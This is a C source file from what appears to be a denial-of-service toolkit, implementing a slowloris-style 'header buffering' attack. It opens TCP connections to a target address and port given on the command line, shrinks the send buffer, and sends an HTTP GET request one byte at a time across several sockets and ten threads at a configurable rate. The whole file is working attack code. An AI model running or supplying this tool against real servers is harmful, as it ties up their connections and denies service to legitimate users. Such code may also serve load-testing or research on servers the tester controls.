#include "../header.h"
#include "../base/make_ipv4.h"
#include "../base/make_tcp.h"
#include "../base/receiver.h"
#include "../base/subnet_mask.h"
#include "../base/time_check.h"
#include "../ddos/header_buffering.h"

#define GET_METHOD "GET / HTTP/1.1\r\nHost: localhost\r\n\r\n"

// session counting
unsigned long g_headbuf_num_total;
unsigned long g_headbuf_num_generated_in_sec;
// from main()
char g_headbuf_src_ip[16] = { 0, };
char g_headbuf_dest_ip[16] = { 0, };
unsigned int g_headbuf_src_mask;
unsigned int g_headbuf_dest_mask;
unsigned int g_headbuf_dest_port_start;
unsigned int g_headbuf_dest_port_end;
unsigned int g_headbuf_request_per_sec;
// for masking next ip address
char g_headbuf_now_src_ip[16] = { 0, };
char g_headbuf_now_dest_ip[16] = { 0, };
unsigned int g_headbuf_now_dest_port;
// thread
pthread_mutex_t g_headbuf_mutex = PTHREAD_MUTEX_INITIALIZER;
pthread_cond_t g_headbuf_cond = PTHREAD_COND_INITIALIZER;
// time checking
struct timespec g_headbuf_before_time;
struct timespec g_headbuf_now_time;
// request msg
char g_headbuf_request_msg[__HEADER_BUFFERING_REQUEST_MSG_SIZE__ ];
// socket
int g_headbuf_maximum = 5;
int *g_headbuf_sockets;
unsigned int g_headbuf_current_idx;
int *g_headbuf_http_cursor;

void header_buffering_print_usage(void)
{
	printf("header buffering Usage : [Src-IP/mask] [Dest-IP/mask] [Dest-Port] [#Requests-Per-Sec]\n");
	return;
}

void *generate_header_buffering(void *data)
{
	int thread_id = *((int*) data);
	while (1) {
		// *** begin of critical section ***
		pthread_mutex_lock(&g_headbuf_mutex);
		//making tcp connection
		if (g_headbuf_sockets[g_headbuf_current_idx] == -2) {
			g_headbuf_sockets[g_headbuf_current_idx] = socket(AF_INET, SOCK_STREAM, 0);
			int sdbf = 2;
			if (setsockopt(g_headbuf_sockets[g_headbuf_current_idx], SOL_SOCKET, SO_SNDBUF, (const char*) &sdbf, sizeof(sdbf))
					== -1) {
				perror("setsockopt failure.\n");
			}
			if (g_headbuf_sockets[g_headbuf_current_idx] == -1) {
				perror("sock creation failed\n");
			}
			struct sockaddr_in servaddr;
			servaddr.sin_family = AF_INET;
			servaddr.sin_addr.s_addr = inet_addr(g_headbuf_dest_ip);
			servaddr.sin_port = htons(g_headbuf_dest_port_start);
			if (connect(g_headbuf_sockets[g_headbuf_current_idx],
						(struct sockaddr*) &servaddr, sizeof(servaddr)) != 0) {
				perror("connect failed\n");
			}
			printf("sock value : %d\n", g_headbuf_sockets[g_headbuf_current_idx]);
		}
		// wait a second
		if (g_headbuf_num_generated_in_sec >= g_headbuf_request_per_sec) {
			pthread_cond_wait(&g_headbuf_cond, &g_headbuf_mutex);
		}
		// time checking
		time_check(&g_headbuf_mutex, &g_headbuf_cond, &g_headbuf_before_time, &g_headbuf_now_time, &g_headbuf_num_generated_in_sec);
		// send 
		int sent_size = -1;
		if (g_headbuf_sockets[g_headbuf_current_idx] >= 0) {
			sent_size = write(g_headbuf_sockets[g_headbuf_current_idx],
					g_headbuf_request_msg + g_headbuf_http_cursor[g_headbuf_current_idx], 1);
			g_headbuf_num_generated_in_sec++;
			g_headbuf_num_total++;
			printf("%lu Socket[%d] send %c : %d\n",
					g_headbuf_num_generated_in_sec,
					g_headbuf_sockets[g_headbuf_current_idx],
					*(g_headbuf_request_msg + g_headbuf_http_cursor[g_headbuf_current_idx]),
					sent_size);
			g_headbuf_http_cursor[g_headbuf_current_idx] += 1;
			if (g_headbuf_http_cursor[g_headbuf_current_idx] >= __HEADER_BUFFERING_REQUEST_MSG_SIZE__) {
				close(g_headbuf_sockets[g_headbuf_current_idx]);
				g_headbuf_sockets[g_headbuf_current_idx] = -1;
			}
			g_headbuf_current_idx++;
		}
		if (g_headbuf_current_idx >= g_headbuf_maximum) {
			g_headbuf_current_idx = 0;
		}
		// *** end of critical section ***
		pthread_mutex_unlock(&g_headbuf_mutex);
	}
	return NULL;
}

void *header_buffering_time_check(void *data)
{
	while (1) {
		pthread_mutex_lock(&g_headbuf_mutex);
		time_check(&g_headbuf_mutex, &g_headbuf_cond, &g_headbuf_before_time, &g_headbuf_now_time, &g_headbuf_num_generated_in_sec);
		pthread_mutex_unlock(&g_headbuf_mutex);
	}
	return NULL;
}

void header_buffering_main(char *argv[])
{
	strcpy(g_headbuf_request_msg, GET_METHOD);
	printf("HTTP header msg:\n%s\n", g_headbuf_request_msg);
	int argc = 0;
	while (argv[argc] != NULL) {
		argc++;
	}
	if (argc != 4) {
		header_buffering_print_usage();
		return;
	}
	split_ip_mask_port(argv,
			g_headbuf_src_ip,
			g_headbuf_dest_ip,
			&g_headbuf_src_mask,
			&g_headbuf_dest_mask,
			&g_headbuf_dest_port_start,
			&g_headbuf_dest_port_end);
	g_headbuf_num_generated_in_sec = 0;
	g_headbuf_num_total = 0;
	memset(&g_headbuf_before_time, 0, sizeof(struct timespec));
	memset(&g_headbuf_now_time, 0, sizeof(struct timespec));
	g_headbuf_request_per_sec = atoi(argv[3]);
	//socket preparation
	g_headbuf_sockets = (int*) malloc(sizeof(int) * g_headbuf_maximum);
	g_headbuf_http_cursor = (int*) malloc(sizeof(int) * g_headbuf_maximum);
	g_headbuf_current_idx = 0;
	int tmp;
	for (tmp = 0; tmp < g_headbuf_maximum; tmp++) {
		g_headbuf_sockets[tmp] = -2;
		g_headbuf_http_cursor[tmp] = 0;
	}
	const int num_threads = 10;
	pthread_t threads[9999];
	int thread_ids[9999];
	for (int i = 0; i < num_threads; i++) {
		thread_ids[i] = i;
	}
	printf("Header Buffering attack to %s using %d threads\n", g_headbuf_dest_ip, num_threads);
	int i;
	for (i = 0; i < num_threads; i++) {
		pthread_create(&threads[i], NULL, generate_header_buffering, (void *)&thread_ids[i]);
	}
	pthread_create(&threads[i], NULL, header_buffering_time_check, NULL);
	for (int i = 0; i < num_threads; i++) {
		pthread_join(threads[i], NULL);
		printf("threads %d joined\n", i);
	}
	printf("Head Buffering attack finished\nTotal %lu packets sent.\n", g_headbuf_num_total);
	free(g_headbuf_sockets);
	free(g_headbuf_http_cursor);
	pthread_mutex_destroy(&g_headbuf_mutex);
	pthread_exit(NULL);
	return;
}
